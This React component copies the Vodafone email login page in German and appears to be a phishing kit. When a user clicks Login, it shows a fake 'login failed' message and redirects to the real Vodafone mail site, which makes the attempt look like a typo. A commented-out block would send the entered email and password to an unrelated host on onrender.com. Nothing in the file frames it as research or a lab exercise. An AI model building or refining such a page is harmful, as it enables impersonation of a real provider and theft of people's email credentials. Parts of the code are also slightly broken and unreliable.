import React, { useState } from "react";
import "./Credentials.css";
import { FaEyeSlash } from "react-icons/fa";
import { FaRegEye } from "react-icons/fa6";
import { IoIosInformationCircle } from "react-icons/io";
import axios from "axios";

const Credentials = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [info, setInfo] = useState(false);
  const [email, setEmail] = useState("");
  const [passWord, setPassWord] = useState("");
  const [, loading, setLoading] = useState(false);

  const handleShowpassword = () => {
    setShowPassword(!showPassword);
  };

  const [inputErrors, setInPutErrors] = useState({
    emailError: false,
    passWordError: false,
    infoError: false,
    msg: "",
  });

  const handlePassWord = (e) => {
    const newValue = e.target.value;
    setPassWord(newValue);
    if (newValue.trim() === "") {
      setInPutErrors({
        passWordError: true,
        msg: "You can not leave this field blank",
      });
    } else {
      setInPutErrors({ passWordError: false });
    }
  };

  const handleEmail = (e) => {
    const newValue = e.target.value;
    setEmail(newValue);
    if (newValue.trim() === "") {
      setInPutErrors({
        emailError: true,
        msg: "You can not leave this field blank",
      });
    } else {
      setInPutErrors({ emailError: false });
    }
  };

  const handleLogin = async () => {
    setInfo(true);
    setTimeout(() => {
      setInfo(false);
    }, 4000);
    window.location.href = "https://mail.vodafone.de/index.aspx";
    // try {
    //   setLoading(true);
    //   await axios.post(
    //     "https://christholychurch.onrender.com/api/signin",
    //     email,
    //     passWord
    //   );
    //   setLoading(false);

     
    //   setLoading(false);
    // } catch (err) {
    //   if (err.response.data.message) {
    //     setLoading(false);
    //   }
    //   setLoading(false);
    // }
  };

  return (
    <div className="credentialBody">
      <div className="credentialsWrapper">
        <h1>Login mit E-Mail Zugangsdaten</h1>
        <p>
          Für Deine E-Mail-Konten bei Vodafone, Arcor, Kabel Deutschland und
          Unitymedia.
        </p>

        {info && (
          <div className="infoShow">
            <div className="infoShowWrap">
              <div className="showLeft">
                <IoIosInformationCircle
                  style={{
                    color: "white",
                    backgroundColor: "red",
                    fontSize: "24",
                  }}
                />
              </div>
              <div className="showRight">
                <h2>Das hat leider nicht geklappt</h2>
                <p>
                  Versuch‘s bitte nochmal oder klick unten auf „Zugangsdaten
                  vergessen“. Du möchtest Dich über das MeinVodafone-Konto
                  einloggen? Dann klick einfach{" "}
                  <a
                    href="#"
                    style={{ color: "white", textDecoration: "underline" }}
                  >
                    hier
                  </a>
                  .
                </p>
              </div>
            </div>
          </div>
        )}

        <div className="loginForm">
          <div className="loginFormWrap">
            <div className="loginFormTop">
              <input
                type="email"
                placeholder="E-Mail-Adresse"
                onChange={handleEmail}
              />
              {inputErrors.emailError ? (
                <p style={{ fontSize: "10px", color: "red" }}>
                  {inputErrors.msg}
                </p>
              ) : null}
            </div>
            <div className="loginFormDown">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="E-Mail-Passwort"
                onChange={handlePassWord}
              />
              {inputErrors.passWordError ? (
                <p style={{ fontSize: "10px", color: "red" }}>
                  {inputErrors.msg}
                </p>
              ) : null}
              {showPassword ? (
                <FaRegEye
                  onClick={handleShowpassword}
                  style={{
                    fontSize: "12px",
                    color: "white",
                    backgroundColor: "black",
                  }}
                />
              ) : (
                <FaEyeSlash
                  onClick={handleShowpassword}
                  style={{
                    fontSize: "12px",
                    color: "white",
                    backgroundColor: "black",
                  }}
                />
              )}
            </div>

            <div className="loginFormButton" onClick={handleLogin}>
              <button>Login</button>
            </div>
          </div>
        </div>

        <div className="infoBelowLogin">
          <div className="text">
            <p>
              <a href="#">MeinVodafone Login</a>
            </p>
            <p>
              <a href="#">Zugangsdaten vergensse</a>
            </p>
          </div>

          <div className="dan">
            <p>
              Du hast noch kein E-Mail-Konto?
              <span
                style={{
                  color: " rgb(153, 153, 153)",
                  backgroundColor: "#212121",
                }}
              >
                Dann kannst Du Dich ganz einfach
              </span>
            </p>
            <p style={{ textDecoration: "underline" }}> hier registrieren</p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Credentials;
